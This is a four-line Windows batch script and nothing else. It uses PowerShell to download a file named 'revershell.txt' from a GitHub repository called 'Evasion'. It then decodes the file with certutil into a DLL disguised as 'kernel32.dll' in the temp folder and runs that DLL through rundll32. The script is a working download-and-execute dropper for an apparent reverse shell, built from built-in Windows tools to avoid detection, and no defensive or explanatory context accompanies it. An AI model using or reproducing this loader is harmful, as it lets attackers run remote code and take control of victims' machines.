@echo off
powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/FabFromTheSnow/Evasion/main/revershell.txt' -OutFile '%temp%\dll.txt'"
certutil -decode "%temp%\dll.txt" "%temp%\kernel32.dll"
rundll32.exe "%temp%\kernel32.dll",DllMain
